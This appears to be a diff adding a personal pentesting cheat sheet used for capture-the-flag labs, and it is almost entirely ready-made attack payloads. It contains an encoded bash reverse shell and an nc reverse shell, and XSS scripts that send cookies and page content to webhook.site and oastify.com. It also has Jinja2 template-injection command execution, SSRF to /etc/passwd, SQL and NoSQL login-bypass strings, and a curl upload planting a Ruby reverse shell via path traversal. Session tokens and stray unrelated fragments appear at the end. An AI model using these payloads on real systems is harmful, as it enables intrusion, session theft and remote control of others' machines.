@@ -1,0 +1,110 @@
+## CS
+Better shell:
+	python -c "import pty; pty.spawn('/bin/bash')"
+	export TERM=xterm
+	CTRL + Z
+	stty raw -echo;fg
+	
+Network Scanning:
+	nmap -T5 -sC -sV -Pn 10.129.114.41
+	
+Web Content Discovery:
+		
+		ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u  http://10.112.140.156/api/FUZZ aq -H “Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.agRxUw.5Xjh86rlCQJG8NGtwjLRFvlCqEY” -e .php
+	ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://10.64.155.19/page/FUZZ -e .php -fs 0-300
+	ffuf -u http://thetoppers.htb/ -H "Host: FUZZ.thetoppers.htb" -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 188
+	$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.80.129.241/customers/signup -mr "username already exists"
+	ffuf -w SecLists/Usernames/Names/names.txt -X POST -d "log=elliot&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.66.189.217%2Fwp-admin%2F&testcookie=1" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.66.189.217/wp-login.php -mr "Invalid username"
+	log=elliot&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.66.189.217%2Fwp-admin%2F&testcookie=1
+RCE:
+	echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzOC4xNTYvOTAwMSAwPiYx= | base64 -d | /bin/sh  
+	rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh 2>&1 | nc 192.168.138.173 9999 > /tmp/p
+
+Prompt Injection → XSS:
+	html:
+	<ImG src="http://192.168.135.247:8000/" />
+	<ImG src=x onerror="http://192.168.135.247:8000" />
+	<iframe src="javascript:alert(`xss`)"> 
+	
+	jscript:
+	<script>fetch('http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3')</script>
+	<script>fetch('http://login.worldwap.thm/change_password.php?new_password=admin')</script>
+	<script>fetch('http://192.168.135.247:8000/' + document.cookie)</script>
+	<a href="#" onclick="this.href='http://192.168.135.247:8000/?'+document.cookie"> boj </a>
+	<a src='http://192.168.135.247:8000/' + document.cookie> boj</a>
+	<script>var i=new Image();i.src=”http://192.168.152.201:9001/?c=”+document.[”coo”+”kie”] </script>
+	
+	jnija2:
+	<% import os; x = os.popen('find / -type f -name flag.txt').read() %> ${x}
+	{{ self.__init__.__globals__.__builtins import('os').popen('echo bHM= |base64 -d |bash').read() }}
+	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+
+	
+	
+	<script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://login.worldwap.thm/change_password.php', true);
+        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                alert("Action executed!");
+            }
+        };
+        xhr.send('action=execute&new_password=admin');
+    </script>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
+        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                alert("Action executed!");
+            }
+        };
+        xhr.send('action=execute&new_password=admin');
+    </script>
+	
+SSRF:
+	/preview.php?url=file:///etc/passwd   graff
+	http://127.0.0.1:80
+	
+Sql injection:
+	' or 1=1 --
+	
+	
+	
+	
+	curl -i -X POST https://asdfghjklzxcv-csc26.cybersecuritychallenge.al/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":{"$ne":null},"password":{"$ne":null}}'
+
+
+
+[{"name":"wedq","comment":"wqewq"},{"name":"a","comment":"{{7*7}}"},{"name":"asd","comment":"asdasd"},{"name":"ssi1","comment":"<!--#include virtual=\"/flag\" -->"},{"name":"ssi2","comment":"<!--#exec cmd=\"cat /flag\" -->"},{"name":"ssi3","comment":"<!--#echo var=\"FLAG\" -->"},{"name":"iframe","comment":"<iframe src=\"/flag\"></iframe>"},{"name":"object","comment":"<object data=\"/flag\"></object>"},{"name":"embed","comment":"<embed src=\"/flag\">"}]
+
+[{"name":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>","comment":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>"}]
+
+[{"name":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>","comment":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>"},{"name":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?content=' + btoa(document.body.innerText));</script>","comment":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?content=' + btoa(document.body.innerText));</script>"},{"name":"<!--#exec cmd=\\\"cat /flag\\\" -->","comment":"<!--#exec cmd=\\\"cat /flag\\\" -->\n"}]
+
+[{"name":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>","comment":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>"},{"name":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?content=' + btoa(document.body.innerText));</script>","comment":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?content=' + btoa(document.body.innerText));</script>"},{"name":"<!--#exec cmd=\\\"cat /flag\\\" -->","comment":"<!--#exec cmd=\\\"cat /flag\\\" -->\n"},{"name":"<script>fetch('/flag').then(r=>r.text()).then(t=>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'RESULT',comment:t})}))</script>","comment":"Great article!"},{"name":"researcher","comment":"<img src=x onerror=\"(async()=>{\n  const paths=['/flag','/admin/flag','/api/flag','/admin','/secret','/debug'];\n  let flag='';\n  for (const p of paths){\n    try{\n      const r = await fetch(p,{credentials:'include'});\n      const t = await r.text();\n      const m = t.match(/CSC26\\{[^}]+\\}/);\n      if(m){ flag=m[0]; break; }\n    }catch(e){}\n  }\n  if(flag){\n    try{\n      await fetch('/api/comments',{\n        method:'POST',\n        headers:{'Content-Type':'application/json'},\n        body: JSON.stringify({name:'flagbot', comment: flag})\n      });\n    }catch(e){}\n  }\n})();\">"},{"name":"Admin","comment":"<img src=x onerror=\"fetch('/flag').then(r=>r.text()).then(t=>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'CAPTURED',comment:t})}))\">"}]
+
+[{"name":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>","comment":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?cookie=' + btoa(document.cookie));</script>"},{"name":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?content=' + btoa(document.body.innerText));</script>","comment":"<script>fetch('https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?content=' + btoa(document.body.innerText));</script>"},{"name":"<!--#exec cmd=\\\"cat /flag\\\" -->","comment":"<!--#exec cmd=\\\"cat /flag\\\" -->\n"},{"name":"<script>fetch('/flag').then(r=>r.text()).then(t=>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'RESULT',comment:t})}))</script>","comment":"Great article!"},{"name":"researcher","comment":"<img src=x onerror=\"(async()=>{\n  const paths=['/flag','/admin/flag','/api/flag','/admin','/secret','/debug'];\n  let flag='';\n  for (const p of paths){\n    try{\n      const r = await fetch(p,{credentials:'include'});\n      const t = await r.text();\n      const m = t.match(/CSC26\\{[^}]+\\}/);\n      if(m){ flag=m[0]; break; }\n    }catch(e){}\n  }\n  if(flag){\n    try{\n      await fetch('/api/comments',{\n        method:'POST',\n        headers:{'Content-Type':'application/json'},\n        body: JSON.stringify({name:'flagbot', comment: flag})\n      });\n    }catch(e){}\n  }\n})();\">"},{"name":"Admin","comment":"<img src=x onerror=\"fetch('/flag').then(r=>r.text()).then(t=>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'CAPTURED',comment:t})}))\">"},{"name":"CAPTURED","comment":"<p style=\"background-color: purple; color: white; text-align: center;\">Hello null. Why don't you render the flag?</p><br/>"},{"name":"user","comment":"<img src=x onerror=\"fetch('/flag?render=true').then(r=>r.text()).then(t=>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'FLAG1',comment:t})}))\">"},{"name":"admin","comment":"<img src=x onerror=\"fetch('/flag?user=admin').then(r=>r.text()).then(t=>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'FLAG2',comment:t})}))\">"},{"name":"test","comment":"<img src=x onerror=\"fetch('/flag',{headers:{'User':'admin'}}).then(r=>r.text()).then(t=>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'FLAG3',comment:t})}))\">"},{"name":"viewer","comment":"<img src=x onerror=\"fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'FLAG4',comment:document.cookie})})\">"},{"name":"FLAG4","comment":""},{"name":"FLAG2","comment":"<p style=\"background-color: purple; color: white; text-align: center;\">Hello null. Why don't you render the flag?</p><br/>"},{"name":"FLAG1","comment":"<p style=\"background-color: purple; color: white; text-align: center;\">Hello null. Why don't you render the flag?</p><br/>"},{"name":"FLAG3","comment":"<p style=\"background-color: purple; color: white; text-align: center;\">Hello null. Why don't you render the flag?</p><br/>"},{"name":"CAPTURED","comment":"<p style=\"background-color: purple; color: white; text-align: center;\">Hello null. Why don't you render the flag?</p><br/>"}]
+
+[{"name":"vfsdgvu","comment":"<img src=x onerror='fetch(\"/admin\").then(r => r.text()).then(t => { new Image().src = \"https://r4whfdnrbaysyf63d2n0vjzmzd56tzho.oastify.com/leak?d=\" + encodeURIComponent(t); });'>"},{"name":"<meta http-equiv=\"refresh\" content=\"0;url=https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?leak=redirect\">","comment":"<meta http-equiv=\"refresh\" content=\"0;url=https://webhook.site/89ec1cef-0b9c-4192-9674-2e408382d79c?leak=redirect\">"},{"name":"q","comment":"<script>\n  document.getElementById('loginBtn').addEventListener('click', () => {\n    const username = prompt('Enter username:');\n    if (username === null) return; // user cancelled\n\n    const password = prompt('Enter password:');\n    if (password === null) return; // user cancelled\n\n    // Simple handling – replace with real authentication logic\n    if (username && password) {\n      alert(`Username: ${username}\\nPassword: ${password}`);\n    } else {\n      alert('Both fields are required.');\n    }\n  });\n</script>"}]
+
+
+curl --path-as-is -i -s -k -X $'POST' \
+ -H $'User-Agent: Mozilla/5.0' \
+ -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary80dMC9jX3srWAsga' \
+ -H $'Accept: */*' \
+ -H $'Connection: keep-alive' \
+ -b $'auth_token=7mcemNTYQA5fBzfeXdmsjQ&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F144.0.0.0+Safari%2F537.36&10.10.16.248; _factsapp_session=9DmV3K6qRpafgSDBeOafU6%2BweGJ%2FHTZTFlFfkgdSLJwfY2uPQ5KzVVT1NETwPnx2ZQ8nedKcB38jN4Bz5oU0CvuU2%2F36ocmjHm22qjvX3sgYQwxEVbHqbFB33gDcYhJz%2F95VCvXP8NfyKYA62%2B4OmcN6UpiaxSQPhjaCino2%2FhA0na5PexLDy6UA09LPOUBS%2FVT4KaxS0kuu7%2F6TNfV27gPrzNf8XaxO1QekyFLM8DOervqoW65qFbS7qXOgCNYfXYWs%2FUWq4XsiNIYNDRzPloFnlFK%2FGDfFCfkl5Q8p%2FvKcCPXu0x8MNEfXH%2FlJOA%2FWsuMaDRvuT7Z95m3K5WDtkXSzALap1%2BMS0IA7HiQwR%2Fu2uxA5qbBO4Dd1GlZvd4sLdA%3D%3D--lceUCQ6JKSYPR8xD--09aY6cH3uEy12O8Gvibtig%3D%3D' \
+ --data-binary $'------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name=\"file_upload\"; filename=\"shell.rb\"\x0d\x0aContent-Type: text/x-ruby-script\x0d\x0a\x0d\x0arequire "socket";s=TCPSocket.new("10.10.16.248",9999);while(c=s.gets);IO.popen(c,"r"){|io|s.print io.read}end\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name=\"folder\"\x0d\x0a\x0d\x0a../../../config/initializers/\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name=\"skip_auto_crop\"\x0d\x0a\x0d\x0atrue\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga--\x0d\x0a' \
+ $'https://10.129.20.167/admin/media/upload?actions=false'settings.xml                                                                   
+-rwxr-x--- 1 wingftp wingftp   241 Nov  2 11:12 ssh_host_ecdsa_key                                                             
+-rw-rw-rw- 1 wingftp wingftp  3272 Nov  2 11:52 ssh_host_key
+
+cc -Wall -Werror -Wextra 
+
